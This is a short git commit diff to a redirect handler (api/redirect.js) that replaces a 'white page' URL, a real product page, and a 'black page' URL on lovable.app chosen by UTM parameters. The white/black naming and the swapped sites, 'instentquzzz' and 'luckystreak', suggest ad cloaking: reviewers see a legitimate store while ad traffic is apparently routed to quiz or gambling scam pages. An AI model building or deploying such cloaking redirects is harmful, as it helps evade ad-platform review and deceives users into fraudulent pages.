1debf34a71c26003a172e46da4d877de4caed6e9
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-11 19:37:23 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://kitchenaid.com.au/products/3-piece-pasta-roller-and-cutter-attachment-ksmpra";
-    const blackPageURL = "https://instentquzzz.lovable.app/";
+    const whitePageURL = "https://farer.com/products/lander-kano";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
